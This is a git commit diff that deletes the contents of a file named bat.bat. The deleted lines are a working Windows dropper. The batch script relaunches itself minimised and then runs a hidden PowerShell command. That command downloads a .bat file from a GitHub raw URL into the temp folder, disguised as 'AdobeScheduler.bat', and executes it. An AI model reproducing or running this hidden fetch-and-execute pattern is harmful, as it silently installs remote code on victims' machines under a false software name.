c8f232c2cbf3313d4e935f7c2e5defa63eb23612
LilGorrillo <peruanoblindado@gmail.com>
2025-02-01 23:59:50 -0600

    Update bat.bat

--- bat.bat
+++ bat.bat
@@ -1,5 +1,1 @@
-@echo off
-if "%1" == "hidden" goto :run
-start /min cmd /c "%~f0" hidden & exit
-:run
-powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/9pressure9x19/lodiablo/refs/heads/main/test.bat' -OutFile \"%TEMP%\AdobeScheduler.bat\"; Start-Process \"%TEMP%\AdobeScheduler.bat\""
+
